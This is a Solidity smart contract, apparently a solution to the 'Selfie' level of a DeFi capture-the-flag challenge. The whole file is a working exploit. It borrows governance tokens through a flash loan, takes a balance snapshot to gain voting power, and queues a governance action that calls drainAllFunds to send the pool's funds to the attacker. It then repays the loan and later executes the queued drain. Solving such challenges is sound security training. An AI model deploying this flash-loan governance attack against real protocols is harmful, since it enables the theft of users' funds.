pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function flashLoan(uint256 amount) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IERC20 {
    function snapshot() external;
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
    function balanceOf(address account) external returns (uint256);
}

contract SelfieAttacker {
    using Address for address payable;

    IPool lender;
    IERC20 liquidityToken;
    IGovernance governance;
    address owner;
    uint256 actionId;

    constructor () public {
        owner = msg.sender;
    }

    function attack(IPool _lender, IERC20 _liquidityToken, IGovernance _governance) external {
        require(msg.sender == owner);
        
        lender = _lender;
        liquidityToken = _liquidityToken;
        governance = _governance;

        lender.flashLoan(1500000 ether);
    }

    function receiveTokens(address token, uint256 amount) external {
 
        liquidityToken.snapshot();

        bytes memory calld = abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            );

        actionId = governance.queueAction(address(lender), calld, 0);
 
        liquidityToken.transfer(address(lender), amount);
    } 

    function drain() external {
        require(msg.sender == owner);

        governance.executeAction(actionId);
    }

}
 